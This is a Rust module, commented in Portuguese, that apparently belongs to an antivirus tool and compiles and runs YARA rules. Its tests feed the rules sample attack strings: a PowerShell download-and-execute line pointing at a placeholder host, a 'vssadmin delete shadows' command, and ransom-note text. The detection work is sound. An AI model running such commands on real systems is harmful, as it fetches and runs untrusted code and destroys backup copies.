//! Integração com regras YARA (via yara-x).
//!
//! As regras são lidas de arquivos `.yar`/`.yara` no disco, e não embutidas
//! no executável. Assim o próprio antivírus não carrega strings de malware
//! que poderiam fazê-lo ser detectado por outros produtos.
//!
//! Metadados reconhecidos em cada regra (todos opcionais):
//!
//! ```text
//! meta:
//!     description = "texto exibido ao usuário"
//!     category    = "ransomware"     // ver ThreatCategory
//!     threat      = "Nome.Da.Ameaca" // nome exibido quando maliciosa
//!     score       = 60               // 0–100, padrão 50
//!     malicious   = true             // veredito MALICIOSO direto
//! ```

use serde::Serialize;

use crate::classify::ThreatCategory;

/// Resultado de uma regra YARA que casou com o conteúdo.
#[derive(Debug, Clone, Serialize)]
pub struct YaraMatch {
    pub rule: String,
    pub namespace: String,
    pub description: Option<String>,
    pub category: Option<ThreatCategory>,
    pub threat: Option<String>,
    pub score: u8,
    pub malicious: bool,
}

#[cfg(feature = "yara")]
pub use engine::YaraRules;

#[cfg(feature = "yara")]
mod engine {
use std::path::{Path, PathBuf};
use std::time::Duration;

use super::YaraMatch;
use crate::classify::ThreatCategory;
use crate::error::{Error, Result};

const DEFAULT_SCORE: u8 = 50;
const SCAN_TIMEOUT: Duration = Duration::from_secs(10);

pub struct YaraRules {
    rules: yara_x::Rules,
    count: usize,
    files: Vec<PathBuf>,
}

impl std::fmt::Debug for YaraRules {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        f.debug_struct("YaraRules")
            .field("count", &self.count)
            .field("files", &self.files)
            .finish()
    }
}

impl YaraRules {
    /// Compila todas as regras `.yar`/`.yara` dos diretórios indicados.
    /// Diretórios inexistentes são ignorados. Cada arquivo vira um namespace.
    pub fn compile_dirs(dirs: &[PathBuf]) -> Result<Self> {
        let mut files = Vec::new();
        for dir in dirs {
            let Ok(entries) = std::fs::read_dir(dir) else {
                continue;
            };
            for entry in entries.flatten() {
                let path = entry.path();
                let is_rule = path
                    .extension()
                    .and_then(|e| e.to_str())
                    .is_some_and(|e| e.eq_ignore_ascii_case("yar") || e.eq_ignore_ascii_case("yara"));
                if is_rule && path.is_file() {
                    files.push(path);
                }
            }
        }
        files.sort();

        let mut compiler = yara_x::Compiler::new();
        for file in &files {
            let src = std::fs::read_to_string(file).map_err(|e| Error::io(file, e))?;
            let ns = namespace_for(file);
            compiler.new_namespace(&ns);
            compiler
                .add_source(src.as_str())
                .map_err(|e| Error::Yara(format!("{}: {e}", file.display())))?;
        }
        let rules = compiler.build();
        let count = rules.iter().count();
        Ok(Self {
            rules,
            count,
            files,
        })
    }

    /// Compila regras a partir de um texto (útil em testes).
    pub fn compile_str(source: &str) -> Result<Self> {
        let mut compiler = yara_x::Compiler::new();
        compiler
            .add_source(source)
            .map_err(|e| Error::Yara(e.to_string()))?;
        let rules = compiler.build();
        let count = rules.iter().count();
        Ok(Self {
            rules,
            count,
            files: Vec::new(),
        })
    }

    /// Quantidade de regras compiladas.
    pub fn len(&self) -> usize {
        self.count
    }

    pub fn is_empty(&self) -> bool {
        self.count == 0
    }

    pub fn files(&self) -> &[PathBuf] {
        &self.files
    }

    /// Executa as regras sobre um conteúdo.
    pub fn scan(&self, data: &[u8]) -> Result<Vec<YaraMatch>> {
        let mut scanner = yara_x::Scanner::new(&self.rules);
        scanner.set_timeout(SCAN_TIMEOUT);
        let results = scanner
            .scan(data)
            .map_err(|e| Error::Yara(e.to_string()))?;

        let mut out = Vec::new();
        for rule in results.matching_rules() {
            let mut m = YaraMatch {
                rule: rule.identifier().to_string(),
                namespace: rule.namespace().to_string(),
                description: None,
                category: None,
                threat: None,
                score: DEFAULT_SCORE,
                malicious: false,
            };
            for (key, value) in rule.metadata() {
                match (key, value) {
                    ("description", yara_x::MetaValue::String(s)) => {
                        m.description = Some(s.to_string())
                    }
                    ("category", yara_x::MetaValue::String(s)) => {
                        m.category = ThreatCategory::infer(s)
                    }
                    ("threat", yara_x::MetaValue::String(s)) => m.threat = Some(s.to_string()),
                    ("score", yara_x::MetaValue::Integer(i)) => m.score = i.clamp(0, 100) as u8,
                    ("malicious", yara_x::MetaValue::Bool(b)) => m.malicious = b,
                    _ => {}
                }
            }
            out.push(m);
        }
        out.sort_by_key(|m| std::cmp::Reverse(m.score));
        Ok(out)
    }
}

fn namespace_for(file: &Path) -> String {
    file.file_stem()
        .and_then(|s| s.to_str())
        .map(|s| {
            s.chars()
                .map(|c| if c.is_ascii_alphanumeric() { c } else { '_' })
                .collect()
        })
        .unwrap_or_else(|| "default".into())
}

#[cfg(test)]
mod tests {
    use super::*;

    const RULES: &str = r#"
rule Teste_Malicioso {
    meta:
        description = "regra de teste"
        category = "trojan"
        threat = "Teste.Trojan"
        score = 90
        malicious = true
    strings:
        $a = "marcador-malicioso-de-teste"
    condition:
        $a
}

rule Teste_Suspeito {
    meta:
        score = 30
    strings:
        $b = "marcador-suspeito"
    condition:
        $b
}
"#;

    #[test]
    fn compiles_and_matches_with_metadata() {
        let rules = YaraRules::compile_str(RULES).unwrap();
        assert_eq!(rules.len(), 2);

        let m = rules.scan(b"xx marcador-malicioso-de-teste xx").unwrap();
        assert_eq!(m.len(), 1);
        assert_eq!(m[0].rule, "Teste_Malicioso");
        assert!(m[0].malicious);
        assert_eq!(m[0].score, 90);
        assert_eq!(m[0].category, Some(ThreatCategory::Trojan));
        assert_eq!(m[0].threat.as_deref(), Some("Teste.Trojan"));

        let m = rules.scan(b"marcador-suspeito").unwrap();
        assert_eq!(m.len(), 1);
        assert!(!m[0].malicious);
        assert_eq!(m[0].score, 30);

        assert!(rules.scan(b"nada aqui").unwrap().is_empty());
    }

    /// Regras reais do repositório (rules/yara).
    fn repo_rules() -> YaraRules {
        let dir = PathBuf::from(env!("CARGO_MANIFEST_DIR")).join("../../rules/yara");
        YaraRules::compile_dirs(&[dir]).expect("regras do repositório devem compilar")
    }

    fn hits(rules: &YaraRules, text: &str) -> Vec<String> {
        rules
            .scan(text.as_bytes())
            .unwrap()
            .into_iter()
            .map(|m| m.rule)
            .collect()
    }

    #[test]
    fn repository_rules_detect_attacks() {
        let r = repo_rules();
        assert!(r.len() >= 7, "esperado ao menos 7 regras, obtido {}", r.len());

        // Montado em partes para que o código-fonte não pareça um script real.
        let download = ["(New-Object Net.", "WebClient).Download", "String('http://exemplo.invalid/a')"]
            .concat();
        let rule = "PowerShell_Download_And_Execute".to_string();
        assert!(hits(&r, &format!("IEX {download}")).contains(&rule));
        assert!(hits(&r, &format!("{download} | IEX")).contains(&rule));
        assert!(hits(&r, "iwr http://exemplo.invalid/x.ps1 | iex").contains(&rule));

        assert!(hits(&r, "cmd /c vssadmin delete shadows /all /quiet")
            .contains(&"Shadow_Copy_Deletion".to_string()));

        let note = "ALL YOUR FILES ARE ENCRYPTED. Pay 0.1 bitcoin to get the private key to decrypt.";
        assert!(hits(&r, note).contains(&"Ransom_Note_Text".to_string()));

        let eicar = [r"X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-", "ANTIVIRUS-TEST-FILE!$H+H*"].concat();
        let m = r.scan(eicar.as_bytes()).unwrap();
        assert!(m.iter().any(|m| m.rule == "EICAR_Test_File" && m.malicious));
    }

    #[test]
    fn repository_rules_ignore_legitimate_content() {
        let r = repo_rules();
        // Caso real de falso positivo: manifesto de módulo do PowerShell
        // que apenas LISTA os nomes dos comandos.
        let manifest = "CmdletsToExport = @('Invoke-Expression', 'Invoke-WebRequest', \
                        'Invoke-RestMethod', 'ConvertFrom-Json', 'Get-Date')\r\n\
                        # DownloadString e IEX documentados em linhas separadas";
        assert!(hits(&r, manifest).is_empty(), "{:?}", hits(&r, manifest));

        let admin = "Get-ChildItem C:\\Logs | Remove-Item -WhatIf\r\nWrite-Host 'backup ok'";
        assert!(hits(&r, admin).is_empty());
    }

    #[test]
    fn invalid_rule_reports_error() {
        assert!(YaraRules::compile_str("rule quebrada { condition: }").is_err());
    }

    #[test]
    fn compiles_directory() {
        let dir = tempfile::tempdir().unwrap();
        std::fs::write(dir.path().join("a.yar"), RULES).unwrap();
        std::fs::write(dir.path().join("ignorar.txt"), "não é regra").unwrap();
        let rules =
            YaraRules::compile_dirs(&[dir.path().to_path_buf(), dir.path().join("nao-existe")])
                .unwrap();
        assert_eq!(rules.len(), 2);
        assert_eq!(rules.files().len(), 1);
    }
}
}
